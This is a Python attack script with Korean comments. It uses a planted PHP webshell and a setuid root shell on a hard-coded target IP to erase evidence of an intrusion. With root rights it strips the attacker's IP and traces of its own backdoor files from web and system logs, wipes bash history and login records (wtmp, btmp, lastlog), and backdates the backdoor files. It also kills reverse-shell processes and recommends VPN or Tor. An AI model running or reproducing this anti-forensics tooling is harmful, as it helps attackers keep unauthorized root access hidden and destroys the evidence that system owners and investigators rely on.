#!/usr/bin/env python3
"""
IP 숨기기 및 로그 삭제
공격자 IP를 모든 로그에서 제거
"""

import requests
from urllib.parse import quote
import re

TARGET = "http://52.78.221.104"
WEBSHELL = f"{TARGET}/uploads/x.php"
ROOTBASH = "/var/www/html/www/uploads/rootbash"

# 자동으로 현재 공격자 IP 감지
def get_my_ip():
    """현재 공인 IP 가져오기"""
    try:
        r = requests.get("https://api.ipify.org", timeout=5)
        return r.text.strip()
    except:
        try:
            r = requests.get("https://ifconfig.me", timeout=5)
            return r.text.strip()
        except:
            return None

def execute_root(cmd):
    """루트 권한으로 명령 실행"""
    full_cmd = f"{ROOTBASH} -p -c '{cmd}'"
    encoded = quote(full_cmd)
    try:
        r = requests.get(f"{WEBSHELL}?x={encoded}", timeout=15)
        return r.text
    except Exception as e:
        return f"Error: {e}"

def clean_logs(target_ip):
    """로그에서 IP 제거"""
    print(f"\n[*] 타겟 IP: {target_ip}")
    print(f"[*] 모든 로그에서 {target_ip} 제거 중...\n")

    log_files = [
        "/var/log/httpd/access_log",
        "/var/log/httpd/error_log",
        "/var/log/httpd/ssl_access_log",
        "/var/log/httpd/ssl_error_log",
        "/var/log/secure",
        "/var/log/messages",
        "/var/log/auth.log",
        "/var/log/syslog",
    ]

    for log_file in log_files:
        # 로그 파일 존재 확인
        check = execute_root(f"test -f {log_file} && echo 'exists' || echo 'not_found'")

        if "exists" in check:
            # IP가 포함된 라인 수 확인
            count_before = execute_root(f"grep -c '{target_ip}' {log_file} 2>/dev/null || echo '0'")
            count_before = count_before.strip()

            if count_before != '0' and count_before.isdigit() and int(count_before) > 0:
                # IP 제거
                execute_root(f"sed -i '/{target_ip}/d' {log_file}")

                # 제거 후 확인
                count_after = execute_root(f"grep -c '{target_ip}' {log_file} 2>/dev/null || echo '0'")
                count_after = count_after.strip()

                print(f"  [✓] {log_file}")
                print(f"      전: {count_before}줄, 후: {count_after}줄")
            else:
                print(f"  [SKIP] {log_file} (IP 없음)")
        else:
            print(f"  [SKIP] {log_file} (파일 없음)")

def clean_bash_history():
    """Bash 히스토리 삭제"""
    print("\n[*] Bash 히스토리 삭제 중...")

    users = ["root", "ec2-user", "apache"]

    for user in users:
        # .bash_history 삭제
        execute_root(f"echo '' > /home/{user}/.bash_history 2>/dev/null || true")
        execute_root(f"echo '' > /root/.bash_history 2>/dev/null || true")
        print(f"  [✓] {user} 히스토리 삭제")

    # 현재 세션 히스토리도 삭제
    execute_root("history -c")
    print(f"  [✓] 현재 세션 히스토리 삭제")

def clean_command_logs():
    """명령 로그 패턴 삭제"""
    print("\n[*] 의심스러운 명령 패턴 삭제 중...")

    patterns = [
        "rootbash",
        "x.php",
        "health-check",
        "system-check",
        "/etc/shadow",
        "base64",
        "wget.*hacked",
        "curl.*hacked",
    ]

    log_files = [
        "/var/log/httpd/access_log",
        "/var/log/httpd/error_log",
    ]

    for log_file in log_files:
        for pattern in patterns:
            execute_root(f"sed -i '/{pattern}/d' {log_file} 2>/dev/null || true")

        print(f"  [✓] {log_file} 의심 패턴 삭제")

def modify_timestamps():
    """백도어 파일 타임스탬프 변경"""
    print("\n[*] 백도어 파일 타임스탬프 변경 중...")

    # 오래된 날짜로 변경 (2023-01-01)
    backdoor_files = [
        "/var/www/html/www/health-check.php",
        "/var/www/html/www/system-check.php",
        "/var/www/html/www/uploads/x.php",
        "/var/www/html/www/uploads/rootbash",
        "/dev/shm/rootbash",
        "/var/tmp/rootbash",
    ]

    for file in backdoor_files:
        execute_root(f"touch -t 202301010000 {file} 2>/dev/null || true")
        print(f"  [✓] {file}")

def hide_processes():
    """프로세스 숨기기 (가능한 범위)"""
    print("\n[*] 프로세스 정리 중...")

    # 불필요한 프로세스 종료
    execute_root("pkill -f 'bash.*tcp' 2>/dev/null || true")
    print("  [✓] 리버스 쉘 프로세스 정리")

def clean_wtmp():
    """로그인 로그 삭제"""
    print("\n[*] 로그인 로그 삭제 중...")

    execute_root("echo '' > /var/log/wtmp")
    execute_root("echo '' > /var/log/btmp")
    execute_root("echo '' > /var/log/lastlog")

    print("  [✓] wtmp, btmp, lastlog 삭제")

def main():
    print("="*60)
    print("  IP 숨기기 및 흔적 제거")
    print("  Target: 52.78.221.104")
    print("="*60)

    # 1. 현재 IP 감지
    print("\n[1/7] 공격자 IP 확인 중...")
    my_ip = get_my_ip()

    if my_ip:
        print(f"  ✓ 감지된 IP: {my_ip}")
    else:
        print("  ! IP 자동 감지 실패")
        my_ip = input("  수동 입력 (엔터=220.121.193.230): ").strip()
        if not my_ip:
            my_ip = "220.121.193.230"

    # 2. 로그에서 IP 제거
    print("\n[2/7] 로그에서 IP 제거 중...")
    clean_logs(my_ip)

    # 3. Bash 히스토리 삭제
    print("\n[3/7] Bash 히스토리 삭제 중...")
    clean_bash_history()

    # 4. 명령 패턴 삭제
    print("\n[4/7] 의심스러운 명령 패턴 삭제 중...")
    clean_command_logs()

    # 5. 타임스탬프 변경
    print("\n[5/7] 백도어 타임스탬프 변경 중...")
    modify_timestamps()

    # 6. 프로세스 정리
    print("\n[6/7] 프로세스 정리 중...")
    hide_processes()

    # 7. 로그인 로그 삭제
    print("\n[7/7] 로그인 로그 삭제 중...")
    clean_wtmp()

    print("\n" + "="*60)
    print("  흔적 제거 완료!")
    print("="*60)
    print()
    print("삭제된 항목:")
    print(f"  - 로그에서 {my_ip} 모두 제거")
    print("  - Bash 히스토리 전체 삭제")
    print("  - 의심스러운 명령 패턴 삭제")
    print("  - 백도어 파일 타임스탬프 변경 (2023-01-01)")
    print("  - 리버스 쉘 프로세스 정리")
    print("  - 로그인 로그 삭제")
    print()
    print("주의:")
    print("  - 완전한 익명성을 보장하지는 않습니다")
    print("  - 네트워크 레벨 로그는 삭제할 수 없습니다")
    print("  - VPN/Tor 사용을 권장합니다")
    print()
    print("="*60)

if __name__ == "__main__":
    main()
